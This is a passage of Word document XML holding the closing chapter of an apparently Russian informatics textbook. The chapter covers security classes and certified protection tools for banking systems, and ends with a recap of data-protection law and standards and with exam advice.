        <w:t>Или **Класс 2Б** (если нет гостайны, но есть серьёзные угрозы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для банков обычно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Класс 1К</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2Б</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (зависит от ЦБ РФ, но для ДБО с 10 млн клиентов — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1К</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Меры защиты** (для Класса 1К):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Организационные</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Политика безопасности (документ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Назначить CISO и службу ИБ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обучение сотрудников (ежегодно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Аудит безопасности (ежегодно, внешний аудитор)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технические</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Криптография**: шифрование БД (ГОСТ Р 34.10, 34.11) — **сертифицированная** (КриптоПро)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**VPN**: ViPNet или другой сертифицированный (для доступа админов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Firewall**: сертифицированный (UserGate, С-Терра)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Антивирус**: Kaspersky или Dr.Web (сертифицированные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SIEM**: MaxPatrol SIEM, R-Vision (мониторинг событий)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IDS/IPS**: обнаружение атак (PT Network Attack Discovery, или UserGate)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MFA**: двухфакторная аутентификация (SMS + TOTP, лучше YubiKey)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Разграничение доступа**: RBAC (клиенты видят только свои счета, менеджеры — всех клиентов, админы — всё)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Резервное копирование**: правило 3-2-1 (ежедневно, хранить 1 год)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Журналирование**: все действия (логины, транзакции, доступы к БД), хранить **3 года** (требование ЦБ РФ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Физические</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Закрытая серверная (биометрия, турникет)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Видеонаблюдение (архив 30 дней)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Контроль доступа (СКУД)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сертификация СЗИ** (обязательно для Класса 1К):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Криптография**: **КриптоПро CSP** (ГОСТ Р 34.10-2012, ГОСТ Р 34.11-2012)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**VPN**: **ViPNet** или **C-Терра VPN** (сертифицированные ФСТЭК)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Firewall**: **UserGate** или **С-Терра Шлюз** (сертифицированные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Антивирус**: **Kaspersky** или **Dr.Web** (есть сертификаты ФСТЭК)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SIEM**: **MaxPatrol SIEM** или **R-Vision SIEM** (российские, сертифицированные)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Для банков с ДБО — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>максимальная защита</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Класс 1К) + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>только сертифицированные СЗИ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (особенно после 2022 года: импортозамещение, госсектор и банки обязаны использовать российские решения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение: Почему юристы и технари должны дружить</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Окей, братан, мы дошли до конца. Теперь ты знаешь:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**152-ФЗ**: как защищать ПДн и не огрести штраф ₽500k</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**GDPR**: как не получить €1.2 млрд штрафа (как Meta)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Критерии защищённости**: чем отличается КС1 от КС3 и зачем банкам сертифицированная криптография</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уголовную ответственность**: почему взлом сайта = до 7 лет</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**PCI DSS**: почему нельзя хранить CVV и как правильно работать с картами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Главный урок</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Безопасность — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не только технологии</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, но и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>законы, стандарты, процессы</w:t>
      </w:r>
      <w:r>
        <w:t>. Если у тебя крутой firewall, но нет политики обновлений — взломают через неопатченную уязвимость (Equifax). Если шифруешь данные, но не подписал NDA с сотрудниками — инсайдер сольёт базу (Snowden).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как сдать экзамен</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Выучи основные законы**: 152-ФЗ (ПДн), 187-ФЗ (КИИ), GDPR, PCI DSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Запомни штрафы**: GDPR (до €20 млн), 152-ФЗ (до ₽500k), УК РФ (до 7 лет)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Критерии защищённости**: УЗ-1/2/3/4 (для ПДн), Классы 1Г-3А (для АС)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Стандарты**: ISO 27001 (114 контролей), NIST (5 функций), CIS (18 контролей)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Реальные примеры**: Equifax, WannaCry, Colonial Pipeline, Meta (€1.2 млрд)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>И самое важное</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Знание законов не освобождает от их соблюдения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (это шутка юристов, но в данном случае наоборот: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>незнание законов не освобождает от ответственности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">). Так что если ты админ/разработчик/CISO — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>читай законы, обновляй системы, шифруй данные, делай backup</w:t>
      </w:r>
      <w:r>
        <w:t>. И не огребёшь ни штраф, ни срок.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Удачи на экзамене!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 🎓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эта глава завершает Раздел 9 (Защита информации) и весь учебник. Теперь ты знаешь всё, что нужно для сдачи экзамена по информатике. Go kick some ass!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 💪</w:t>
      </w:r>
    </w:p>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